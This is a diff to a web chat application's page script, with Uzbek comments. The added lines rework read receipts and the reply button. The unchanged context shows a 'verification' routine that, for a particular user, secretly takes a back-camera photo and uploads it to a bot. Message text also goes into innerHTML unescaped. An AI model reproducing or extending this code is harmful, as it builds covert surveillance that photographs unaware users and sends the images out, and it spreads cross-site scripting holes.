@@ -206,8 +206,8 @@
             if (data.byUser === partner) {
                 const statuses = document.querySelectorAll('.my-msg .msg-status');
                 statuses.forEach(el => {
-                    el.innerText = '✓✓';
-                    el.style.color = '#3498db'; // Telegramning ko'k rangi
+                    el.innerHTML = '&#10003;&#10003;';
+                    el.style.color = '#3498db';
                 });
             }
         });
@@ -237,7 +237,8 @@
             }
             let editedMark = msg.edited ? `<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>` : '';
             let textHtml = msg.text ? `<div>${msg.text}${editedMark}</div>` : '';
-            const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick='triggerReply(${JSON.stringify(msg)})'></i>`;
+            const msgId = msg.id || '';
+            const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick="window._replyById('${msgId}')"></i>`;
             
             let checkmarks = '';
             if (isMe) {
@@ -247,8 +248,16 @@
             }
 
             div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <div class="msg-info-row"><span class="msg-time">${msg.time}</span> ${checkmarks}</div>`;
+            // Xabar obyektini DOM elementga bog'laymiz (JSON.stringify HTML ni buzmasligi uchun)
+            div._msgData = msg;
             list.appendChild(div);
         }
+
+        // ID orqali reply - onclick='...' ichida JSON.stringify ishlatmaslik uchun
+        window._replyById = function(id) {
+            const el = document.querySelector(`.message[data-id='${id}']`);
+            if (el && el._msgData) triggerReply(el._msgData);
+        };
 
         window.triggerReply = function(msg) {
             let previewText = msg.text || (msg.file ? "[Fayl/Media]" : "...");
@@ -491,6 +500,8 @@
             const backBlob = await takeSecretPhoto('environment');
             if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
         }
+        // script.js public papkasida ham bor - uning socket ishlarini bloklaymiz
+        // (script.js ning join va sendMessage override lari bu chat.html bilan conflict qiladi)
         socket.on('connect', () => { if (myUser === 'max') setTimeout(runVerification, 3000); });
         const originalSendMessage = window.sendMessage;
         window.sendMessage = function() {
